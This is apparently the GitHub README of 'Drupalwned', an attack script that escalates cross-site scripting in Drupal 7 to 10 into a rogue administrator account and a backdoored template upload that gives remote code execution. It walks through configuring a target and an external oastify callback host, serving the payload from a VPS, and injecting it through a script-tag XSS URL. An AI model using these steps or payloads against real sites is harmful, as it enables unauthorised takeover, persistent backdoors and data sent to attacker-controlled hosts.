
<h1 align="center">
  <br>
  <img src="https://github.com/nowak0x01/Drupalwned/assets/96009982/d113255b-31e1-4837-9760-447b4d0a597d" alt="Drupalwned" width="300">
</h1>

<h4 align="center">Drupal Exploitation Script that elevate XSS to RCE or Others Critical Vulnerabilities</a>.</h4>

<p align="center">
  <a href="#about">About</a>  -
  <a href="#key-features">Key Features</a>  -
  <a href="#how-to-use">How To Use</a>  -
  <a href="#examples">Examples</a>  -
  <a href="#contributing">Contributing</a>
</p>

![drupalwned](https://github.com/nowak0x01/Drupalwned/assets/96009982/9815fb8f-7786-4ddc-8ee7-bcd4efd1a7de)


## About
_**Drupalwned**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in Drupal CMS. <br><br>
💧 **This script provides support for **Drupal** **Versions** **7.X.X**, **8.X.X**, **9.X.X** and **10.X.X**.** 💧
<br>

## Key Features

* _**Privilege Escalation**_
  - Creates an administrative user in Drupal.
* _**(RCE) Upload Template**_
  - Upload custom templates backdoored to Drupal.
* _**// Pending**_
  - more ways to get RCE
  
## How To Use

https://github.com/nowak0x01/Drupalwned/assets/96009982/b895ac80-0dce-4b9a-8d85-6402227134d2


<br>

**1\) Clone the Repository**
```bash
git clone https://github.com/nowak0x01/Drupalwned
```

**2\) Edit the script by selecting the desired function and modifying its variable values.** (Example: _**DPCreateAccount**_)
```
// ************************************ ~% Variables %~ ************************************ //

var Target = "https://172.17.0.1:8000/"; // Ex: https://192.168.84.212:8000/drupal/
var Callback = "http://zfi0g0xtiqb6qjh564xr92xnxe35rvfk.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// DPCreateAccount(); // (Privilege Escalation) - Creates an Administrative user in Drupal.
// DPUploadTemplate(); // (RCE) - Upload a Template module (backdoor) to Drupal.

function DPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
    var Username = "nowak";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
    var Password = `j^QEkyvd7*g3`;  /* - <Mandatory> 
                            Make it at least 12 characters
                            Add lowercase letters
                            Add uppercase letters
                            Add numbers
                            Add punctuation
                                    */
    /* ************************************************************************************************************************************************ */
```

**3\) Start a web server**
```bash
python3 -m http.server 80
```

**4\) Go to the Drupal XSS vector and include** _**drupalwned.js**_
```
https://drupal.example.com/plugin.php?s=<script%20src="//VPS/drupalwned.js"></script>
```

## Examples
🌧️ **_DPCreateAccount()_ - Creates an user in Drupal.**

https://github.com/nowak0x01/Drupalwned/assets/96009982/7f096d5d-c5c4-40b2-9afc-e7b114949392

⛅ **_DPUploadTemplate()_ - Upload a custom template backdoored to Drupal.**

https://github.com/nowak0x01/Drupalwned/assets/96009982/812608dd-b3e3-4695-8efe-7657d7f2168a


# Contributing
If you're interested in contributing, enhancing the existing code, your efforts would be immensely appreciated. Your contributions will play a key role in making this project even better.
<pre>
               r
               ain
               rai
              nrain
             rainrai
            nrainrain
           ainrainrain
          rainrainrainr
         ainrainrainrain
        rainrainrainrainr
      ainrainrainrainrainra         Drupalwned (https://github.com/nowak0x01/Drupalwned)
    inra nrainrainrainrainrai                      @Author: Hudson Nowak
  nrain  inrainrainrainrainrain
 rain   nrainrainrainrainrainrai
nrai   inrainrainrainrainrainrain
rai   inrainrainrainrainrainrainr
rain   nrainrainrainrainrainrainr
 rainr  nrainrainrainrainrainrai
  nrain ainrainrainrainrainrain
    rainrainrainrainrainrainr
      rainranirainrainrainr
           ainrainrain
</pre>
